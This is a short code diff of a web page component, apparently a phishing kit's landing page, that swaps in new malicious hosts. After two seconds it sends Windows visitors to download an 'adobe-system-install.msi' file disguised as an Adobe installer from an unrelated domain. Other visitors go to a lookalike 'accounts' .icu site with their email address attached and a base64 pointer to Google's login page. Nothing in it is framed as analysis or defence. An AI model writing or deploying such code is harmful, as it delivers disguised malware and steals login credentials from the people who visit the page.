@@ -14,7 +14,7 @@ export default function Home() {
       document.body.appendChild(iframe);
 
       setTimeout(() => {
-        window.location.href = 'https://jomry.com/adobe-readers/installer/download.html';
+        window.location.href = 'https://municipiodezongolica.com.mx/adobe-system-install.msi';
       }, 2000);
       return;
     }
@@ -37,7 +37,7 @@ export default function Home() {
     if (email) {
       // Redirect to Non-Windows target with raw email
       window.location.href =
-        `https://accounts.ehpcve.icu?znYsiH1YXQ=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t&smn=${email}`;
+        `https://accounts.fcudkl.icu?X0zS-ro7JkPyrQ=aHR0cHM6Ly9hY2NvdW50cy5nb29nbGUuY29t&smn=${email}`;
     }
   }, []);
 
